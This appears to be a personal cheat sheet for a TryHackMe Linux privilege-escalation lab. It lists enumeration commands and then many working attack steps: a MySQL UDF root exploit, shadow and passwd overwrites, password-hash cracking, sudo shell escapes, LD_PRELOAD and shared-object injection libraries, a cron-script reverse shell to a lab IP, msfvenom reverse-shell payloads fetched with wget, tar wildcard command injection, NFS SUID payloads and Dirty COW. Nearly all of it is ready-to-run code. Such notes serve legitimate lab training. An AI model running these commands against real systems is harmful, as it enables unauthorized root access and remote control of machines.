# 1. TEST SETUP/ENVIRONMENT

## TRYHACKME
```
https://tryhackme.com/room/linuxprivesc
ssh user@1.1.1.1
ssh -oHostKeyAlgorithms=+ssh-dss user@1.1.1.1
pass:password321
```

## METASPLOITABLE


## FILE TRANSFER - WEB BASED
```
cd /var/www/html/priv_esc
python3 -m http.server
wget http://10.18.5.137:8000/shell.elf
```

## FILE TRANSFER - SMB BASED



# 2. MANUAL ENUMERATION 

## USERS
```
whoami
id
cat /etc/passwd
```

## HOSTNAME
```
hostname
```

## OS VERSION & ARCHITECTURE
```
cat /etc/issue
cat /etc/~release
uname
uname -a
```

## RUNNING PROCESS & SERVICES
```
ps 
ps -aux
pgrep mysqld
```

## NETWORK INFORMATION 
```
ifconfig
ifconfig -a
ip a
route
routel
/sbin/route
netstat
ss -anp
```

## FIREWALL STATUS AND RULES
```
/etc/iptables
/sbin/iptables
iptables -L -v
```

## SCHEDULED TASKS
```
ls -lah /etc/cron*
cat /etc/crontab 
```

## INSTALLED APPS & PATCH LEVELS
```
dpkg –l
dpkg -l | grep whois
```

## READABLE/WRITABLE FILES AND DIRECTORIES
```
find / -writeable -type d 2>/dev/null
```

## UNMOUNTED DISKS
```
mount
cat /etc/fstab
/bin/lsblk
```

## DEVICE DRIVERS AND KERNEL MODULES
```
/sbin/modinfo ip_tables
lsmod
```

## BINARIES THAT AUTO ELEVATE
```
find / -perm -u=s -type f 2>/dev/null
```

# 3. AUTOMATED ENUMERATION 

## UNIX-PRIVESC-CHECK
```
https://pentestmonkey.net/tools/audit/unix-privesc-check
sudo wget https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
sudo tar -xf unix-privesc-check-1.4.tar.gz
wget http://10.18.5.137:8000/unix-privesc-check-1.4/unix-privesc-check
chmod 777 unix-privesc-check
./unix-privesc-check
./unix-privesc-check standard
./unix-privesc-check detailed
./unix-privesc-check standard > output.txt
cat output.txt
```

## LINPEAS
```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## LINUX PRIVILEGE CHECKER


# 4. MISCONFIGURATIONS/VULNERABILITIES EXPLOITATION 

## CATEGORY "SERVICES" - SERVICE EXPLOITS
check mysql database version
```
mysql -V
mysql --version
mysql -u root -p
mysql> show variables like '%version%';
```
MySQL is running as root, but with this root access, we cannot get root access using the shell escape technique.
```
mysql -u root -p
mysql> \! sh
```
exploit POC is as follows:
```
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root
use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
/tmp/rootbash -p
rm /tmp/rootbash
exit
```

## CATEGORY "WEAK FILE PERMESSIONS" - READABLE /ETC/SHADOW
```
ls -l /etc/shadow
cat /etc/shadow
```
```
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt
cat hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --show
```
```
su root
password: password123
whoami && ifconfig
```
IMPORTANT FILES
```
┌──(kali㉿kali)-[/tmp]
└─$ ls -al /etc/passwd
-rw-r--r-- 1 root root 3231 Mar 10 12:08 /etc/passwd
                                                                                                                               
┌──(kali㉿kali)-[/tmp]
└─$ ls -al /etc/shadow
-rw-r----- 1 root shadow 1509 Mar 10 12:08 /etc/shadow
                                                                                                                               
┌──(kali㉿kali)-[/tmp]
└─$ ls -al /etc/sudoers
-r--r----- 1 root root 1714 Oct 10  2022 /etc/sudoers
                                                                                                                               
┌──(kali㉿kali)-[/tmp]
└─$ ls -al /etc/ssh/sshd_config
-rw-r--r-- 1 root root 3222 Oct 16  2022 /etc/ssh/sshd_config
                                                                                                                               
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## CATEGORY "WEAK FILE PERMESSIONS" - WRITEABLE /ETC/SHADOW
```
ls -l /etc/shadow
mkpasswd -m sha-512 test_password
$6$RI8vxrmPWU0Xv$u4EgyPSgA7SLBs0O.ZUbYrbzavoP.B81ApAcQfBnz483l5Phrc.8HegjUZgvOoGL74h0NG0rlYZDhVkmKjzQs0
nano /etc/shadow
root:???????????????:17298:0:99999:7:::
su root
password: test_password
whoami && ifconfig
```

## CATEGORY "WEAK FILE PERMESSIONS" - WRITEABLE /ETC/PASSWD
```
ls -l /etc/passwd
openssl passwd test_password
IgClDflgL8ROI
nano /etc/passwd
root:x:0:0:root:/root:/bin/bash
root:??????????????:0:0:root:/root:/bin/bash
root:IgClDflgL8ROI:0:0:root:/root:/bin/bash
su root
```
```
echo 'newroot:IgClDflgL8ROI:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
id
whoami && ifconfig
```

## CATEGORY "SUDO" - SHELL ESCAPE BINARIES 
```
https://gtfobins.github.io/
sudo -l 
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
```
IFTOP
sudo iftop
press shift + !
type /bin/sh
exit iftop interface: 
press escape , type :q , press enter 
```
```
FIND
sudo find . -exec /bin/sh \; -quit
```
```
NANO
sudo nano -s /bin/sh
press cntr R (^R)
press cntr X (^R^X)
type 
reset; sh 1>&0 2>&0  
```

```
VIM
sudo vim -c ':!/bin/sh'
```
```
SUID/SUDO binaries - privilege escalation possibilities 
--SUDO/SUID binaries
----shell escape on binaries
----write access on binaries 
----exploit binaries 
```

## CATEGORY "SUDO" - ENVIRONMENT VARIABLES
```
sudo -l
cat /home/user/tools/sudo/preload.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
sudo LD_PRELOAD=/tmp/preload.so program-name-her
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find
#
```

## CATEGORY "CRON JOBS" - FILE PERMESSIONS 
```
cat /etc/crontab
locate overwrite.sh
cat /usr/local/bin/overwrite.sh
ls -lah /usr/local/bin/overwrite.sh
nano /usr/local/bin/overwrite.sh
bash -i >& /dev/tcp/10.18.5.137/4444 0>&1
```
```
nc -nvlp 4444
```

## CATEGORY "CRON JOBS" - PATH ENVIRONMENT VARIABLE
```
cat /etc/crontab
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
cd /home/user
pwd
nano overwrite.sh

#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

chmod +x /home/user/overwrite.sh
cd tmp
ls -al
/tmp/rootbash -p
rm /tmp/rootbash
exit
```

## CATEGORY "CRON JOBS" - WILD CARDS
```
cat /etc/crontab
cat /usr/local/bin/compress.sh

cd /home/user
tar czf /tmp/backup.tar.gz *
```
```
cd /var/www/html/priv_esc
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=4444 -f elf -o shell.elf
python3 -m http.server
```
```
wget http://10.18.5.137:8000/shell.elf
chmod +x /home/user/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf
nc -nvlp 4444
```

## CATEGORY "SUID / SGID EXECUTEABLES" - SHELL ESCAPE BINARIES

## CATEGORY "SUID / SGID EXECUTEABLES" - KNOWN EXPLOITS
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
cd /var/www/html/priv_esc
sudo wget https://www.exploit-db.com/download/39535
wget http://10.18.5.137:8000/39535 
sed -i -e 's/\r$//' 39535.sh
/home/user/tools/suid/exim/cve-2016-1531.sh
```

## CATEGORY "SUID / SGID EXECUTEABLES" - SHARED OBJECT INJECTION
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
/usr/local/bin/suid-so
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
/home/user/.config/libcalc.so
mkdir /home/user/.config
user@debian:~$ cat /home/user/tools/suid/libcalc.c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
        setuid(0);
        system("/bin/bash -p");
}
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
/usr/local/bin/suid-so
```

## CATEGORY "SUID / SGID EXECUTEABLES" - ENVIRONMENT VARIABLES
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
strings /usr/local/bin/suid-env
gcc -o service /home/user/tools/suid/service.c
user@debian:~$ cat /home/user/tools/suid/service.c
int main() {
        setuid(0);
        system("/bin/bash -p");
}

PATH=.:$PATH /usr/local/bin/suid-env
/usr/local/bin/suid-env
```

## CATEGORY "SUID / SGID EXECUTEABLES" - ABUSING SHELL FEATURES 1
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

strings /usr/local/bin/suid-env2
/bin/bash --version
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

## CATEGORY "SUID / SGID EXECUTEABLES" - ABUSING SHELL FEATURES 2
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
rm /tmp/rootbash
exit
```

## CATEGORY "PASSWORDS & KEYS" - HISTORY FILES
```
cat ~/.*history | less
mysql -h somehost.local -uroot -ppassword123
su root
password: password123
```

## CATEGORY "PASSWORDS & KEYS" - CONFIG FILES
```
ls /home/user
cat /home/user/myvpn.ovpn
su root
```

## CATEGORY "PASSWORDS & KEYS" - SSH KEYS
```
ls -la /
ls -l /.ssh
chmod 600 root_key
ssh root@10.10.10.1 -i root_key
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.36.3
```

## CATEGORY "" - NFS
```
cat /etc/exports
sudo su
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.13.43:/tmp /tmp/nfs
cd /tmp/nfs  
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
/tmp/shell.elf
```

## CATEGORY "KERNEL VULNERABILITIES"   
```
CVE-2017-1000112 DIRTYCOW
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
/usr/bin/passwd
sudo wget https://www.exploit-db.com/download/40839
wget http://10.18.5.137:8000/40839 -O 40839.c
gcc -pthread 40839.c -o 40839
gcc 40839.c -o 40839
```


